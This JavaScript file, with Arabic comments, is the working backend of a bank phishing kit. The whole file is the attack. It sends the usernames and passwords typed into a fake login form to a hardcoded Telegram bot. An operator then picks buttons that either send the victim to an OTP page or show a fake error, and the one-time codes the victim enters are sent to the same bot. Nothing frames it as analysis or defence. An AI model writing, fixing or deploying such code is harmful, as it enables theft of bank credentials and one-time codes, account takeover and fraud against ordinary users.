/* BrosTec Protocol - Technical Fix Only */
const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
const CHAT_ID = "7865246557";
let lastUpdateId = 0;

// 1. وظيفة لجلب معرف آخر تحديث لتجاهل كل ما سبق
async function setupPolling() {
    try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        if (data.result.length > 0) {
            lastUpdateId = data.result[0].update_id;
        }
    } catch (e) { console.error("Initial polling setup failed"); }
}
setupPolling();

// 2. وظيفة إرسال الرسالة مع الأزرار
async function sendToTelegram(text, buttons) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        })
    });
}

// 3. وظيفة مراقبة الأوامر الجديدة حصراً (The Fix)
function startPolling() {
    const pollInterval = setInterval(async () => {
        try {
            // نطلب التحديثات التي تبدأ بعد آخر ID مسجل لدينا
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
            const data = await res.json();
            
            if (data.result && data.result.length > 0) {
                for (const update of data.result) {
                    lastUpdateId = update.update_id; // تحديث المعرف لمنع التكرار
                    
                    if (update.callback_query) {
                        const command = update.callback_query.data;
                        
                        if (command === "request_otp") {
                            clearInterval(pollInterval);
                            window.location.href = "otp.html";
                        }
                        
                        if (command === "login_error") {
                            clearInterval(pollInterval);
                            document.getElementById('loader').style.display = 'none';
                            if(document.getElementById('error-msg')) {
                                document.getElementById('error-msg').style.display = 'block';
                            }
                        }
                        
                        if (command === "otp_error") {
                            clearInterval(pollInterval);
                            document.getElementById('loader').style.display = 'none';
                            if(document.getElementById('otp-error')) {
                                document.getElementById('otp-error').style.display = 'block';
                                document.getElementById('otp_val').value = "";
                            }
                        }
                    }
                }
            }
        } catch (e) { console.error("Polling error"); }
    }, 2000); // فحص كل ثانيتين
}

// 4. ربط الأحداث (Events)
if (document.getElementById('loginForm')) {
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        document.getElementById('loader').style.display = 'flex';
        const msg = `🏦 *New Login Attempt*\nUser: \`${document.getElementById('user').value}\`\nPass: \`${document.getElementById('pass').value}\``;
        sendToTelegram(msg, [
            [{text: "طلب OTP 📲", callback_data: "request_otp"}],
            [{text: "خطأ في البيانات ❌", callback_data: "login_error"}]
        ]);
        startPolling();
    });
}

if (document.getElementById('otpForm')) {
    document.getElementById('otpForm').addEventListener('submit', function(e) {
        e.preventDefault();
        document.getElementById('loader').style.display = 'flex';
        const msg = `🔑 *OTP Received*: \`${document.getElementById('otp_val').value}\``;
        sendToTelegram(msg, [
            [{text: "OTP خطأ ❌", callback_data: "otp_error"}],
            [{text: "تم بنجاح ✅", callback_data: "done"}]
        ]);
        startPolling();
    });
}
